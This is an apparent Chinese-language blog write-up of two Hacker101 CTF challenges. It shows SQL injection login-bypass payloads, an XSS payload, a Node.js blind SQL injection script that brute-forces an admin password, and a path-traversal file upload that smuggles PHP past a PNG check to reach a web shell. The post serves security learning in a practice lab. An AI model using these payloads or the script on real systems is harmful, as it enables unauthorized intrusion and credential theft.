---
title: Hacker 101 CTF Write Up Part 1 - Micro-CMS v2, TempImage
categories: Security
date: 2019-09-04 20:28:20
tags: [CTF, security]
header-img: /images/banner.jpg
catalog: true
---

近期想到 HackerOne 找找 Bug Bounty  
卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄

<!-- more -->

# Micro-CMS v2

根據題目總共有 3 個 Flag

##  0x00  

一進來頁面長這樣
![](/images/ctf/part1-cms-v2-1-01.png)

試著建立一個新的 Page, 發現要登入帳號密碼
![](/images/ctf/part1-cms-v2-1-02.png)

看到帳號密碼就是要先下個單引號，結果就噴出 exception 了
![](/images/ctf/part1-cms-v2-1-03.png)

根據 error 的 sql  
`cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')`
可以推斷出他是透過 username select 出來後再用程式比對密碼  
有 SQL Injectiob 的話，就可以走 union all select 的套路
username: `'union all select 1#`
password: `1`
![](/images/ctf/part1-cms-v2-1-04.png)
> 補充:  
> `union all select` 可以組合前一個和後一個 SQL 結果
> 假設 `select username from admins where uername = 'admin'` 會回傳 `admin`
> 但如果是 `select username from admins where uername = 'not_exists'` 會回傳空的東西
> 配合 `union all select` 的話
> `select username from admins where uername = 'admin' union all select 1` 會回傳 `admin`, `1` 兩個值  
> 那如果是 `select username from admins where uername = 'not_exists' union all select 1` 只會回傳 `1`

登入成功後，可以看到有一個 Private Page 
![](/images/ctf/part1-cms-v2-1-05.png)

點進去後發現第一個 FLAG
![](/images/ctf/part1-cms-v2-1-06.png)

##  0x01  

接下來嘗試新建立 Page
![](/images/ctf/part1-cms-v2-2-01.png)

接下來就試著輸入 `<svg/onload=alert(document.cookie)`，建立成功
![](/images/ctf/part1-cms-v2-2-02.png)

發現好像也沒跳出什麼東西，嘗試去玩玩修改功能
發現到第二次修改成功的時候會出現 Not Found URL，覺得有點疑惑
![](/images/ctf/part1-cms-v2-2-03.png)

於是把 Payload 記下來拿到 Post Man 重新送送看，結果就拿到 FLAG 了
![](/images/ctf/part1-cms-v2-2-04.png)

##  0x02 

這個漏洞找有點久，因為登入的時候，過幾秒會被導入到首頁，不會被停留在登入成功的頁面  
為了不讓 js 執行，所以改用 Post Man 去送，想看一下回來的 html 是什麼  
發現回來的 html 註解裡面有一個小提示
![](/images/ctf/part1-cms-v2-3-01.png)

看起來是要往拿到真正的帳號密碼才會拿到 FLAG
於是把資料丟到 sqlmap 就把資料 dump 出來的
![](/images/ctf/part1-cms-v2-3-02.png)

登入成功後就拿到 FLAG 了

這邊用另一個不用 sqlmap 而是改用自己寫程式去做 (雖然 sqlmap 原理應該跟這個差不多)  
主要會用到 `length(password)` 和 `length(username)` 的方式先去判斷有幾個字元  
再透過 mysql `_` 的匹配符號去做猜測，這個符號會去做一個比對  
假設字串是 username = abcde，username like 'a____' 就會比對成功，會回傳 true  
但如果是 username like 'b____' 就會比對失敗，會回傳 false  
接下來會利用這個特性去撰寫一個程式去找到完整的帳號密碼  

假如說 `length(password) = 5`  
在 mysql 裡面可以這樣去寫 `select username from admins where username = '' or password like '_____'`  
然後在慢慢替換第一字 `select username from admins where username = '' or password like 'a____'` 去找到回傳 true 的狀況  

先嘗試去找到密碼的長度，一般輸入結果如果為 false 會回傳 `Uknown User`
![](/images/ctf/part1-cms-v2-3-03.png)

試著把 payload 改成 `' or 1=1#` 發現回傳*Invalid Password*，代表說有找到使用者  
因為 false || true 的結果為 true，所以有成功從資料庫撈到資料  
![](/images/ctf/part1-cms-v2-3-04.png)

那是試著改成 `' or 1=221#` 發現回傳 *Uknown User*
![](/images/ctf/part1-cms-v2-3-05.png)

所以只要讓 username 那一段 sql 回傳 true，他就會把真正的密碼帶上來  
所以接下來可以試著用 `' or length(password)=1#` 慢慢去比對看長度  
最後發現密碼長度為 8 

接下來要構造出 like 的 payload 為 `' or password like binary '________'#`  
如果上面成立的話，會回傳 *Invalid Password* 失敗的話則會回傳 *Uknown User*  
根據這兩個結果可以撰寫程式了，這邊會用 node.js 去做列舉  
這邊加上 binary 去強制去使用 CASE SENSITIVE 去做判別  
密碼為: marcelle  
![](/images/ctf/part1-cms-v2-3-06.png)

所以最後 username: `' or 1=1#` password: `marcelle`  
登入後拿到 FLAG!  
![](/images/ctf/part1-cms-v2-3-07.png)

這邊附上程式
```javascript=
const axios = require('axios');
const qs = require('querystring');
(async () => {
    let passwordLength = 8;
    let password = (() => {
        let counter = 0;
        let temp = '';
        while (counter < passwordLength) {
            temp += '_';
            counter++;
        }
        return temp
    })();
    let found = false
    let answer = '';
    let position = 0;
    let allPosibile = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    while (!found) {
        let tempPassword = password
        for (const char of allPosibile) {
            tempPassword = tempPassword.split("");
            tempPassword[position] = char;
            tempPassword = tempPassword.join("")
            let payload = `' or password like binary '${tempPassword}'#`
            let result = await axios({
                url: 'http://34.74.105.127/58b04db906/login',
                method: 'post',
                headers: {
                    'content-type': 'application/x-www-form-urlencoded'
                },
                data: qs.stringify({
                    username: payload,
                    password: ''
                })
            }).then(response => response.data)
            if (result.includes('Invalid password')) {
                console.log(`${position}: ${char}`);
                answer += char;
                break;
            }
        }
        position++;
        if (position >= passwordLength) {
            break;
        }
    }
    console.log(answer);
})()
```

# TempImage

根據題目總共有 2 個 Flag

##  0x00 

剛進來頁面是這樣
![](/images/ctf/part1-temp-1-01.png)

點進去 upload.php 的頁面，發現可以上傳檔案  
![](/images/ctf/part1-temp-1-02.png)

順便開原始碼有哪些 input  
![](/images/ctf/part1-temp-1-03.png)

發現有 `file` 以及 `filename` 可以做更動，這邊先試著上傳一張正常的圖片
URL: `http://34.74.105.127/020fb13cda/files/eb705c0e32ff0f15c9801f5d40fe290f_test-3.png`
看起來是把我上傳的檔名變成檔案名稱了，這邊就試著改 filename (這邊使用 burp suit 去改，順便方便等等可以改內容)
把 filename 改成 test-3.html 結尾
![](/images/ctf/part1-temp-1-04.png)

發現成功改成 .html 且成功是內容
URL: `http://34.74.105.127/020fb13cda/files/807fb7eecbe831518d078107d8f0fedf_test-3.html`
![](/images/ctf/part1-temp-1-05.png)

這邊嘗試加上 ../ 在 filenmame 上面，發現爆出 FLAG 了
![](/images/ctf/part1-temp-1-06.png)
![](/images/ctf/part1-temp-1-07.png)

##  0x01 

從上一個 FLAG 發現有一個 move_upload_file 裡面會帶一個 path
![](/images/ctf/part1-temp-1-07.png)

這邊試著符合這個 path 帶入 `/../test-3.html` 試試看
![](/images/ctf/part1-temp-2-01.png)

發現 URL 變成 `http://34.74.105.127/020fb13cda/files/test-3.html`
往上跳了一層 ... !?  
因為此 server 可以執行 php，於是改成 php 試試看
順便在檔案內容之中多加一個 `<?php phpinfo(); ?>`
![](/images/ctf/part1-temp-2-02.png)

發現內容還是顯示圖片格式?
![](/images/ctf/part1-temp-2-03.png)

這邊試著把檔案內容全砍掉只留下 `<?php phpinfo(); ?>`
![](/images/ctf/part1-temp-2-04.png)

結果被判定成不是 PNG 不能上傳了
![](/images/ctf/part1-temp-2-05.png)

如果不是改檔案副檔名和 Content-Type 會影響格式判斷的話  
有可能是根據 PNG 的前幾個 bytes 去判斷，所以這邊只留下前面的 bytes  
![](/images/ctf/part1-temp-2-06.png)

發現無法顯示 QQ，這邊不確定原因，試了非常久
![](/images/ctf/part1-temp-2-07.png)

後來想到在上傳到上一層不知道會怎樣，於是試試看
![](/images/ctf/part1-temp-2-08.png)

發現成功執行 PHP 檔案！！所以代表可能是 files 那一層有鎖不能顯示 php 檔案
URL: `http://34.74.105.127/020fb13cda/test-3.php`
![](/images/ctf/part1-temp-2-09.png)

接下來上傳 web shell 去看看有什麼檔案
![](/images/ctf/part1-temp-2-10.png)

逛了一下，發現 index.php 有 FLAG 存在
![](/images/ctf/part1-temp-2-11.png)